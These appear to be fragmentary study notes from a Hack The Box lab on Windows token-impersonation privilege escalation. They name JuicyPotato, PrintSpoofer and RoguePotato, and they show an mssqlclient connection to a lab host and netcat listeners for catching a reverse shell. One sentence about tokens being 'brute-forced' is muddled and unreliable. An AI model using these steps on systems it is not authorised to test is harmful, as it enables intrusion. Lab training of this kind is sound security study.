In Windows, each process has a token, which is just a location in memory that could be brute-forced by users that cannot read memory. In order for us to use the tokens, the account must have the SeImpersonate privilege enabled. This privilege is only given to administrative accounts usually. 
...
```shell-session
realCustampin@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
...
```shell-session
realCustampin@htb[/htb]$ sudo nc -lnvp 8443
...
- JuicyPotato is no longer able to be utilized on Windows 2019 and Windows 10 1809 and later. Don't worry though, we are able to use PrintSpoofer and RoguePotato to conduct the same attack. 
...
**Catching the Reverse Shell on AttackBox**
```shell-session
realCustampin@htb[/htb]$ nc -lnvp 8443
